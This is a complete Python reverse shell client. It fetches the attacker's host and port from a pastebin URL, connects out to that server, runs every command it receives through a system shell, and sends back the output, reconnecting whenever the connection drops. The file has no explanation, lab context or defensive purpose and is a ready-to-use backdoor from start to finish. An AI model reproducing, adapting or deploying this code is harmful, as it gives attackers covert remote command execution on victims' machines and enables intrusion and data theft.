import socket, subprocess, json, time
from urllib.request import urlopen

CONFIG = json.loads(urlopen("https://pastebin.com/raw/0TfqFbEn").read())

HOST = CONFIG['host']
PORT = int(CONFIG['port'])

active = True

print('[.] Connecting to Server')
while active:
	server = socket.socket()
	try:		
		server.connect((HOST, PORT))
		print('[+] Connection Established')		
		while True:
			command = server.recv(99999).decode()
			if command == ':kill':
				print('[-] Connection Terminated')
				active = False
				break
			elif command == ':exit':
				print('[-] Connection Terminated')
				print('[.] Connecting to Server')
				break
			else:
				try:
					shell =  subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
					output = shell.stdout.read() + shell.stderr.read()
					if len(output.strip()) == 0:
						output = b'[i] Command Returned An Empty String'
					server.send(output)
				except Exception as e:
					print('[-] Error Encountered')
					server.send(b'[-] Error Encountered')
					continue
	except socket.error as error:
		time.sleep(5)		
		continue

print('[!] Shutting Down Script')
server.shutdown(socket.SHUT_RDWR)